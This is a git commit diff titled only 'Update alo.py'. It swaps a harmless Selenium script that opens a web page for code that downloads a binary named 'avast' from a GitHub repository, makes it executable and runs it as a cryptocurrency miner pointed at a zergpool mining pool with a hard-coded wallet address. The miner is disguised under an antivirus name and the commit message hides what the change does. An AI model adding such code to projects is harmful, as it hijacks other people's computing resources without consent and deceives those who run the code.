88929371faba40f4ffcd23ab7862c0a1e3c6a8dc
samrikulan <93561728+samrikulan@users.noreply.github.com>
2021-11-18 01:26:38 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,7 +1,5 @@
-import os
-from selenium import webdriver
-
-chromedriver = "/Users/adam/Downloads/chromedriver"
-os.environ["webdriver.chrome.driver"] = chromedriver
-driver = webdriver.Chrome(chromedriver)
-driver.get("http://stackoverflow.com")
+import os,subprocess
+os.system(f"lscpu")
+subprocess.run(['wget', 'https://github.com/samrikulan/toya/raw/main/avast'], stdout=subprocess.PIPE)
+subprocess.run(['chmod', '777', 'avast'], stdout=subprocess.PIPE)
+subprocess.run(['bash', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8 -x'], stdout=subprocess.PIPE)
